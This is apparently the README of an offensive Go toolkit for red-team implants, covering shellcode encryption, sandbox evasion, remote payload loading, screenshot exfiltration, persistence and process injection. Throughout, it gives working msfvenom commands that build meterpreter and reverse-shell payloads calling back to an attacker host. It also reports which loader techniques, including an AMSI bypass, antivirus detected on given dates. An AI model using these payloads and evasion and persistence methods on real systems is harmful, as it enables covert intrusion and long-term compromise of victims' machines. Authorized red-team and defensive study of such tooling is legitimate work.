# OffensiveGolang
<p align="center">
  <img src="https://i.imgur.com/YxxEj4T.png" alt="OffensiveGolang" width="200" height="250" />
</p>

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://github.com/MrTuxx/OffensiveGolang/blob/master/LICENSE) [![GitHub go.mod Go version of a Go module](https://img.shields.io/github/go-mod/go-version/gomods/athens.svg)](https://github.com/MrTuxx/OffensiveGolang)
<p align="justify">
OffensiveGolang is a collection of offensive Go packs inspired by different repositories. Ideas have been taken from <a href="https://github.com/bluesentinelsec/OffensiveGoLang">OffensiveGoLang</a> and <a href="https://www.youtube.com/watch?v=3RQb05ITSyk">Ben Kurtz's DEFCON 29 talk</a>.
</p>
<p align="justify">
This repository has some basic implementations and examples that depending on the environment in which they are used can be easily detected by defensive systems. The goal is to support the rapid development of red team tools by providing common functions and with the possibility of improvements by the community.
The different modules presented are the following:
</p>

The different modules presented are the following:

- **Encryption**: Module that allows encrypting the payload shellcode using AES and a 32-byte random key.
- **Evasion**: Based on other projects such as [robotgo](https://github.com/go-vgo/robotgo), functions have been implemented that identify screen dimensions, mouse movements and process information in order to avoid the execution of binaries in sandboxes.
- **Exfil**: Implements functions that allow loading the shellcode from an external web server or sending a screenshot after having used the screenshot method through a POST request.
- **Persistence**: Allows you to create a scheduled task using the methods provided by the [taskmaster](https://github.com/capnspacehook/taskmaster) project. In addition, you can also modify the Windows registry to run a binary at startup.
- **Payloads**: set of methods collected from different repositories that allow from generating a simple reverse shell in Golang to injecting code into the memory of an existing process.
- **Examples**: Different examples using the modules described above.

## Installation 🛠

```
go get github.com/MrTuxx/OffensiveGolang
```

### Linux

- Installation of dependencies

```
$ sudo apt install xsel xclip gcc libc6-dev libx11-dev xorg-dev libxtst-dev libpng++-dev xcb libxcb-xkb-dev x11-xkb-utils libx11-xcb-dev libxkbcommon-x11-dev libxkbcommon-dev gcc-multilib gcc-mingw-w64 libz-mingw-w64-dev
```

### Windows

- Install Mingw64 and ZLIBx64
    - Extensive Guide: https://github.com/lowkey42/MagnumOpus/wiki/TDM-GCC-Mingw64-Installation

1. Download and install [TDM GCC Mingw64](https://jmeubank.github.io/tdm-gcc/)
    add \TDM\bin to PATH
2. Download and unzip [ZLIBx64](http://sourceforge.net/projects/mingw-w64/files/External%20binary%20packages%20(Win64%20hosted)/Binaries%20(64-bit))
3. copy _\zlib\bin to \TDM\bin
4. copy \zlib\include to \TDM\include
5. copy \zlib\lib to \TDM\lib

## Basic Examples 🚀
### Simple Go Reverse Shell

- Simple Golang connection **(UPDATE: Not detected by AV as of 19/03/2022)**

![](https://i.imgur.com/fySYfUp.png)

### Simple Go Reverse Shell in a dll
- Simple Golang connection **(UPDATE: Not detected by AV as of 19/03/2022)**

![](https://i.imgur.com/N9LiWuo.png)


### CreateThread

#### Dynamic link library (DLL)

- Meterpreter Staged Payload with Encryption Module implemented. **(UPDATE: Not detected by AV as of 19/03/2022)**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
```
![](https://i.imgur.com/yfb4fMw.png)

>NOTE: Some msf commands trigger the AV

#### Portable Executable (PE)

- Meterpreter Staged Payload with Evasion and Encryption Module implemented. **(UPDATE: Detected by AV as of 19/03/2022)**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
```
- Reverse Shell Staged Payload with Evasion and Encryption Module implemented.**(UPDATE: Not detected by AV as of 19/03/2022)**

```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload2.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
```
![](https://i.imgur.com/HZWJnbV.png)

### RemoteThread

#### Dynamic link library (DLL)

- Reverse Shell Staged Payload downladed from external web server with Evasion and Encryption Module implemented. **(UPDATE: Not detected by AV as of 19/03/2022)**
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload2.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
```
![](https://i.imgur.com/3JfL6Nv.png)

#### Portable Executable (PE)

- Meterpreter Staged Payload downladed from external web server with Evasion and Encryption Module implemented. **(UPDATE: Not detected by AV as of 19/03/2022)**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
```
![](https://i.imgur.com/wgGHWr4.png)

>NOTE: Some msf commands trigger the AV

### Syscall

#### Dynamic link library (DLL)
- Meterpreter Staged Payload with Evasion Module implemented. **(UPDATE: Not detected by AV as of 19/03/2022)**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
```
![](https://i.imgur.com/5iVuw0J.png)

#### Portable Executable (PE)

- Meterpreter Staged Payload downladed from external web server with Evasion and Encryption Module implemented. **(UPDATE: Detected by AV as of 19/03/2022)**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
```
- Reverse Shell Staged Payload downladed from external web server with Evasion and Encryption Module implemented. **(UPDATE: Not detected by AV as of 19/03/2022)**
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.0.21 -o /opt/Offensive-Golang/payload2.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c --smallest
```
### Fiber

#### Portable Executable (PE)

- Meterpreter Staged Payload downladed from external web server with Evasion and Encryption Module implemented. **(UPDATE: Not detected by AV as of 23/05/2024)**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.145 -o /tmp/payload.txt -b "\x00" EXITFUNC=thread LPORT=443 -f c
```
![](https://i.imgur.com/fwoBcKS.png)

### Ekko

#### Portable Executable (PE)

- Simple Go Reverse Shell applying the Ekko Technique. **(UPDATE: Not detected by AV as of 23/05/2024)**

![](https://i.imgur.com/j5Npeis.png)

### AMSI ByPass
- AMSI ByPass with malicious dll using rundll32.exe **(UPDATE: Not detected by AV as of 23/05/2024)**
  
![](https://i.imgur.com/wuDFOb3.png)

### Persistence

- Task scheduled with malicious dll using syscall

![](https://i.imgur.com/wuDFOb3.png)

## References :books:

- Installation
    - https://github.com/go-vgo/robotgo#installation
    - https://github.com/lowkey42/MagnumOpus/wiki/TDM-GCC-Mingw64-Installation#zlib-x64
    - https://stackoverflow.com/questions/58793857/robotgo-for-windows-10-fatal-error-zlib-h-no-such-file-or-directory
- Obfuscation
    - https://github.com/unixpickle/gobfuscate
    - https://github.com/burrowers/garble
    - https://github.com/goretk/redress
    - https://github.com/josephspurrier/goversioninfo
    - https://github.com/Tylous/Limelighter
- Golang Offensive Tools
    - https://github.com/Binject/go-donut
    - https://github.com/optiv/ScareCrow
    - https://github.com/vyrus001/go-mimikatz
    - https://www.symbolcrash.com/2021/03/02/go-assembly-on-the-arm64/
    - https://github.com/awgh/cppgo
    - https://github.com/Binject/awesome-go-security
    - https://www.symbolcrash.com/2019/02/23/introducing-symbol-crash/
    - https://go.dev/doc/effective_go
    - https://github.com/redcode-labs/Coldfire
    - https://medium.com/@justen.walker/breaking-all-the-rules-using-go-to-call-windows-api-2cbfd8c79724
    - https://medium.com/@mat285/encrypting-streams-in-go-6cff6062a107
    - https://blog.jan0ski.net/golang/index.html
    - https://github.com/brimstone/go-shellcode/
    - https://github.com/bluesentinelsec/OffensiveGoLang
    - https://github.com/erikgeiser/govenom
    - https://github.com/AllenDang/w32
    - https://gist.github.com/prachauthit/ca7754e07901d09554b8036fb2f11bfd
    - https://github.com/monoxgas/sRDI
    - https://www.youtube.com/watch?v=AGLunpPtOgM
    - https://www.youtube.com/watch?v=3RQb05ITSyk
